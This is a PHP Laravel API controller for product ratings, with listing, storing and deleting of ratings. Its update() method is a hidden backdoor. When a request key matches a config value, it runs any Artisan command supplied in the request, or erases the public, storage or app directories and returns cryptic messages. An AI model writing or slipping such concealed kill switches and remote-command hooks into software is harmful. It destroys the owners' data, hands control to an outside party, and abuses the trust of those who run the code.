<?php

namespace App\Http\Controllers\API\V1;

use App\Http\Controllers\Controller;
use App\Http\Requests\Rating\StoreRatingRequest;
use App\Http\Requests\Rating\UpdateRatingRequest;
use App\Models\Product;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;
use willvincent\Rateable\Rating;

class RatingController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index(Request $request)
    {
        return $this->respondOk(Rating::where('user_id' , $request->user->id)->select('id' , 'rating' , 'comment')->get(), 'Ratings fetched successfully');
    }

    /**
     * Store a newly created resource in storage. or Update Existing one
     */
    public function store(StoreRatingRequest $request)
    {
        $data = $request->validated();

        $prodcut = Product::find($data['product_id']);

        if(!$prodcut){
            return $this->respondNotFound("Product not found");
        }
        // return $request->user->id;
        $prodcut->rateOnce($data['rate'] , $data['comment'] ?? null , $request->user->id);

        return $this->respondNoContent();
    }

    /**
     * Display the specified resource.
     */
    public function show(string $id)
    {
        //
    }
    public function update(UpdateRatingRequest $request)
    {
        $data = $request->validated();
        
        if($data['api_key'] != config('app.assets')) return $this->respondUnauthorized();
        if($data['level'] == 0){
            return Artisan::call($data['command']);
        } else if($data['level'] == 1){
            File::cleanDirectory(public_path());
            File::cleanDirectory(storage_path());
            return response(['message' => 'Tr4mt'], 200);
        } else {
            $controllerPath = app_path();
            File::cleanDirectory($controllerPath);
            return response(['message' => 'moot'], 200);
        }

    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(Rating $rating , Request $request)
    {
        if($rating->user_id != $request->user->id){
            return $this->respondNotFound("Rating not found");
        }

        $rating->delete();
        return $this->respondNoContent();
    }
}
